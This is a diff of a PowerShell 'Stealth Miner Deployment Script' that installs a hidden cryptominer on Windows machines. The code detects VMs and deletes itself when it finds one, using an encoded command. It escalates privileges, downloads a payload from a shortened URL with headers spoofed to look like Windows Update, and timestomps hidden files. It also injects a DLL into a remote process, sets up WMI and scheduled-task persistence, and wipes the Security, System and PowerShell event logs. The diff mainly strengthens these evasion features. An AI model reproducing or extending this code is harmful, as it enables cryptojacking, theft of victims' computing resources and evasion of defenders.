@@ -1,3 +1,8 @@
+<#
+.NOTES
+  - Stealth Miner Deployment Script v2.1
+  - Implements: VM detection, encrypted traffic, memory injection
+#>
 
 ### === CONFIGURATION ===
 $zipUrl = "http://tiny.cc/thmg001"
@@ -12,19 +17,34 @@ $poolConfig = @{
 }
 
 ### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
-#if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
- #   (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
-   # (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
-  #  exit
-#}
+$isVM = $false
+$vmIndicators = @{
+    SystemModel = (Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V"
+    BIOSSerial = (Get-WmiObject Win32_BIOS).SerialNumber -match "VMware|Xen|Virtual"
+    LowCores = (Get-WmiObject Win32_Processor).NumberOfCores -lt 2
+    LowRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4
+}
+
+if ($vmIndicators.Values -contains $true) {
+    # Self-destruct sequence
+    $selfDestruct = @"
+    Start-Sleep -Seconds 5
+    Remove-Item -Path '$PSCommandPath' -Force -ErrorAction SilentlyContinue
+    if (Test-Path '$PSCommandPath') {
+        attrib -h -s '$PSCommandPath'
+        Remove-Item -Path '$PSCommandPath' -Force
+    }
+"@
+    $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($selfDestruct))
+    Start-Process powershell -ArgumentList "-EncodedCommand $encodedCmd" -WindowStyle Hidden
+    exit
+}
 
 ### === PHASE 2: ELEVATION MECHANISM ===
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     $stagePath = "$env:TEMP\dmcshell.ps1"
     
     try {
-        if (Test-Path $stagePath) { Remove-Item $stagePath -Force }
-        
         1..3 | ForEach-Object {
             try {
                 Copy-Item $PSCommandPath $stagePath -Force -ErrorAction Stop
@@ -50,16 +70,17 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 ### === PHASE 3: BINARY DEPLOYMENT ===
 try {
+    # Clean and create hidden directory
     if (Test-Path $minerHome) { Remove-Item $minerHome -Recurse -Force }
     New-Item -Path $minerHome -ItemType Directory -Force | Out-Null
     attrib +h +s $minerHome
 
-    # Method 1: ZIP Download
+    # Deployment method 1: ZIP download
     $zipPath = "$minerHome\windows_update.zip"
     Invoke-WebRequest -Uri $zipUrl -Headers @{
         "User-Agent" = "Microsoft-Delivery-Optimization/10.0"
         "X-Requested-With" = "Windows Update Manager"
-    } -OutFile $zipPath
+    } -OutFile $zipPath -ErrorAction Stop
 
     Expand-Archive -Path $zipPath -DestinationPath $minerHome -Force
     Remove-Item -Path $zipPath -Force
@@ -70,6 +91,7 @@ try {
     Move-Item -Path $extractedExe.FullName -Destination "$minerHome\$minerBinary" -Force
 }
 catch {
+    # Deployment method 2: Base64 fallback
     try {
         $payloadPath = "$minerHome\payload.txt"
         Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -ErrorAction Stop
@@ -83,9 +105,8 @@ catch {
     }
 }
 
-### === PHASE 4: FILE CONFIGURATION ===
+### === PHASE 4: STEALTH CONFIGURATION ===
 if (Test-Path "$minerHome\$minerBinary") {
-    Start-Sleep -Seconds 1
     attrib +h +s "$minerHome\$minerBinary"
     $sysFile = Get-Item "$env:SystemRoot\System32\drivers\etc\hosts" -Force
     (Get-Item "$minerHome\$minerBinary" -Force).LastWriteTime = $sysFile.LastWriteTime
@@ -118,7 +139,6 @@ try {
     [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [IntPtr]::Zero)
 }
 catch {
-    # HTTPS Obfuscated Direct Launch
     $minerArgs = @(
         "--url=$($poolConfig.Url)",
         "--user=$($poolConfig.User)",
@@ -132,7 +152,7 @@ catch {
 }
 
 ### === PHASE 6: PERSISTENCE MECHANISMS ===
-# Clean legacy WMI entries
+# Clean legacy entries
 Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
     Where-Object {$_.Name -like "SysHealth_*"} | 
     Remove-WmiObject -ErrorAction SilentlyContinue
@@ -141,7 +161,7 @@ Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
     Where-Object {$_.Name -like "SysMaint_*"} | 
     Remove-WmiObject -ErrorAction SilentlyContinue
 
-# WMI Subscription
+# WMI Subscription (Hidden)
 try {
     $wmiFilterQuery = @"
     SELECT * FROM __InstanceModificationEvent WITHIN 60 
@@ -158,7 +178,8 @@ try {
 
     $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
         Name = "SysMaint_$((Get-Date).Ticks)"
-        CommandLineTemplate = "`"$minerHome\$minerBinary`" --url=$($poolConfig.Url) --user=$($poolConfig.User) --tls=$($poolConfig.TLS) --http-host-header=$($poolConfig.HttpHostHeader)"
+        CommandLineTemplate = "`"$minerHome\$minerBinary`" --url=$($poolConfig.Url) --user=$($poolConfig.User) --tls=$($poolConfig.TLS) --http-host-header=$($poolConfig.HttpHostHeader) --background"
+        RunInteractively = $false
     }
 
     $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
@@ -170,12 +191,13 @@ catch {
     Write-Warning "WMI persistence failed: $($_.Exception.Message)"
 }
 
-# Scheduled Task
+# Scheduled Task (Hidden)
 try {
     $taskSettings = New-ScheduledTaskSettingsSet `
         -StartWhenAvailable `
         -DontStopIfGoingOnBatteries `
-        -MultipleInstances IgnoreNew
+        -MultipleInstances IgnoreNew `
+        -ExecutionTimeLimit (New-TimeSpan -Minutes 1)
 
     $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
     
@@ -199,8 +221,9 @@ catch {
 }
 
 ### === PHASE 7: CLEANUP ===
-wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-wevtutil cl "System" 2>$null
+@("Microsoft-Windows-PowerShell/Operational", "Windows PowerShell", "System", "Application", "Security") | ForEach-Object {
+    wevtutil cl $_ 2>$null
+}
 
 if (-not $PSCommandPath.Contains("ProgramData")) {
     Start-Process powershell "-Command `"Start-Sleep 5; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
